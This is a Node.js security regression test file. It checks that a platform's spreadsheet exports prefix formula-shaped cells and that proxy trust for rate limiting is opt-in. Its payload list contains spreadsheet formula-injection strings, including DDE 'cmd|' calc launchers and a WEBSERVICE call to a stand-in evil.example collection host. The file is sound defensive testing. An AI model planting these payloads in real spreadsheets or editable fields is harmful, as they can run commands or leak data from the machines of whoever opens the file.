/**
 * Security regression tests.
 *
 * These cover two weaknesses found by testing the running platform rather than
 * by reading it, and both would be silent if they came back: the workbook opens
 * without complaint, and the rate limiter still answers 429 to anyone who does
 * not think to change a header.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';

process.env.JWT_SECRET = 'test-secret-for-the-security-suite-only';

const { buildGenericWorkbook, buildRegisterWorkbook } = await import('../src/services/export-xlsx.js');

/**
 * Excel, LibreOffice and Google Sheets evaluate a cell whose text begins with
 * =, +, - or @. Leading whitespace is stripped before that decision, so a tab
 * does not protect the cell.
 */
const FORMULA_PAYLOADS = [
  '=cmd|\' /C calc\'!A0',
  '@SUM(1+1)*cmd|calc',
  '+HYPERLINK("https://evil.example","quarterly review")',
  '-2+3+cmd|calc',
  '\t=WEBSERVICE("https://evil.example/collect")',
  '=1+1'
];

async function cellsOf(buffer) {
  const JSZip = (await import('jszip')).default;
  const zip = await JSZip.loadAsync(buffer);
  let xml = '';
  for (const name of Object.keys(zip.files)) {
    if (name.endsWith('.xml') && /sheet|sharedStrings/.test(name)) {
      xml += await zip.file(name).async('string');
    }
  }
  return { xml, cells: [...xml.matchAll(/<t[^>]*>([^<]*)<\/t>/g)].map((m) => m[1]) };
}

/** A cell Excel would evaluate: begins with a formula character, unprefixed. */
function unsafeCells(cells) {
  return cells.filter((c) => /^[\t\r\n ]*(=|\+|-|@)/.test(c) && !/^(&#39;|')/.test(c));
}

test('spreadsheet export neutralises formula-shaped cells', async (t) => {
  await t.test('a generic workbook prefixes every formula-shaped cell', async () => {
    const buffer = await buildGenericWorkbook({
      title: '=cmd|title',
      subtitle: '@SUM(1+1)',
      headers: ['Reference', 'Name', 'Owner'],
      rows: FORMULA_PAYLOADS.map((p, i) => [`TST-${i + 1}`, p, p]),
      orgName: '=cmd|org'
    });
    const { xml, cells } = await cellsOf(buffer);

    assert.ok(!/<f>/.test(xml), 'a cell was written as an Excel formula element');
    assert.deepEqual(unsafeCells(cells), [], 'cells begin with a formula character and are unprefixed');
    // A test that passes because the text was dropped proves nothing about
    // escaping, so confirm the payload is present and merely inert.
    assert.ok(xml.includes('cmd|'), 'the payload did not survive into the workbook to be escaped');
  });

  await t.test('the document register prefixes a formula-shaped title', async () => {
    // The register is the workbook circulated to auditors, and a document title
    // is editable by anyone with write access.
    const buffer = await buildRegisterWorkbook({
      orgName: 'Test Organisation',
      documents: FORMULA_PAYLOADS.map((p, i) => ({
        reference: `POL-TST-${String(i + 1).padStart(3, '0')}`,
        title: p,
        doc_type: 'policy',
        domain_key: 'iam',
        status: 'draft',
        version: '0.1',
        classification: 'internal',
        owner_name: p,
        approver_name: '',
        effective_date: '',
        review_date: ''
      }))
    });
    const { xml, cells } = await cellsOf(buffer);
    assert.ok(!/<f>/.test(xml));
    assert.deepEqual(unsafeCells(cells), []);
    assert.ok(xml.includes('cmd|'));
  });

  await t.test('ordinary text is left exactly as written', async () => {
    // The mitigation must not prefix anything a reader would notice.
    const buffer = await buildGenericWorkbook({
      title: 'Control Register',
      headers: ['Reference', 'Name'],
      rows: [['POL-IAM-001', 'Identity and Access Management Policy'], ['CTL-1', '15 minutes']],
      orgName: 'Najd Financial Group'
    });
    const { cells } = await cellsOf(buffer);
    assert.ok(cells.includes('Identity and Access Management Policy'));
    assert.ok(cells.includes('15 minutes'));
    assert.ok(!cells.some((c) => c.startsWith("'")), 'a benign cell was prefixed');
  });
});

test('proxy trust is opt-in, not assumed', () => {
  // Trusting X-Forwarded-For with no proxy in front lets a caller choose the
  // address the rate limiters key on, and rotating it resets the bucket.
  // Per-account lockout still stops credential guessing, so this is not a route
  // to an account — but the layer is free to keep.
  const src = fs.readFileSync(new URL('../src/index.js', import.meta.url), 'utf8');
  assert.match(src, /process\.env\.TRUST_PROXY/,
    'trust proxy should come from the environment');
  assert.ok(!/app\.set\('trust proxy',\s*1\)/.test(src),
    'trust proxy must not be unconditionally enabled');
});
